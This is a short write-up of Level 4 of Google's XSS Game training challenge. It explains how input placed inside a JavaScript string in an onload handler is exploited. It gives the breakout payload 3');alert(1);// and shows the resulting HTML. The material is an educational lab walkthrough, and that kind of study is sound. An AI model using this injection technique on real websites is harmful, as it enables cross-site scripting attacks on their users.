# Google XSS Game – Level 4: JavaScript Context Injection

---

## 🎯 Mission Description  
User input must be properly escaped depending on the context it’s inserted into.  
This level demonstrates how dangerous it can be when input is injected **directly into JavaScript code** — not just HTML.

---

## 🎯 Mission Objective  
Inject a script that triggers `alert(1)` inside the app.  
✅ The injection point is **inside a JavaScript function parameter**, not regular HTML.

---

## 🧪 Steps (My Approach)

1. 🔍 Viewed the source code and found:

   ```html
   <img src="/static/loading.gif" onload="startTimer('3');" />
   ```

   → The value `3` is passed as a string to the `startTimer()` function.  
   → This is our injection point.

---

2. ❌ First try: inject HTML special chars

   ```
   X">x
   ```

   Result:

   ```html
   <img src="/static/loading.gif" onload="startTimer('X&quot;&gt;x');" />
   ```

   → The characters were escaped. HTML injection blocked.

---

3. ✅ New idea: inject inside the JavaScript function

   - Close the string and function call:
     ```
     3');
     ```

   - Inject the payload:
     ```
     alert(1);
     ```

   - Comment out the rest:
     ```
     //
     ```

---

## ✅ Final Payload

```javascript
3');alert(1);//
```

🔎 Which results in:

```html
<img src="/static/loading.gif" onload="startTimer('3');alert(1);//');" />
```

💥 `alert(1)` gets executed — mission complete!

---

## 🧠 Notes  
- This is a **JavaScript context XSS**, not HTML.  
- Injection point is inside a JS string → need to **close the string properly** before injecting.  
- No need to break out of HTML attributes — just craft smart payloads within the JS.

---

## ✅ Status: Solved 🎉
